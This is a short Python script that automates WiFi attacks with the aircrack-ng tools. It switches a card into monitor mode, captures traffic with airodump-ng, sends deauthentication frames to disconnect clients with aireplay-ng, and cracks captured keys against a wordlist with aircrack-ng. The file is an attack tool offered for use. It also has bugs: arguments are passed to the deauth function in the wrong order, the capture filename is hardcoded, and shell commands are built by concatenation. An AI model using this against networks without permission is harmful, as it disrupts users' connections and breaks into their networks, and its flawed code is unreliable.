import os
import argparse

def main():
    parser = argparse.ArgumentParser(description='manual to this script')
    parser.add_argument("-device", type=str, default="wlan0")
    parser.add_argument("-dssid", type=str, default="0")
    parser.add_argument("-mode", type=str, default="s")
    parser.add_argument("-w", type=str, default="/usr/share/wordlists/fasttrack.txt")
    parser.add_argument("-bssid", type=str, default="0")
    args = parser.parse_args()
    
    device = args.device
    dssid = args.dssid
    mode = args.mode
    bssid = args.bssid
    wordlist = args.w
    pack="pack-01.ivs"

    if "mon" in device:
        pass
    else:
        os.system("airmon-ng start "+device)
        device = device+"mon"
    
    if mode == "s" and bssid == "0":
        wifi_scan1(device)
    
    elif mode == "s" and bssid != "0":
        wifi_scan2(device,bssid)

    elif mode == "c" and bssid !="0":
        wifi_crack(wordlist,pack)
    
    elif mode == "a" :
        wifi_attack(device,bssid,dssid)
    else:
        print("Error")
        os.system(exit)
 
def wifi_scan1(device):
    os.system("airodump-ng -w pack "+device)

def wifi_scan2(device,bssid):  
    os.system("airodump-ng -w pack "+device+" --bssid "+bssid)

def wifi_attack(bssid,dssid,device):
    os.system("aireplay-ng -0 2 -a" + bssid + " -c "+dssid + " " +device)

def wifi_crack(wordlist,pack):
    os.system("aircrack-ng "+ pack +" -w "+ wordlist)

if __name__ == "__main__":
    main()
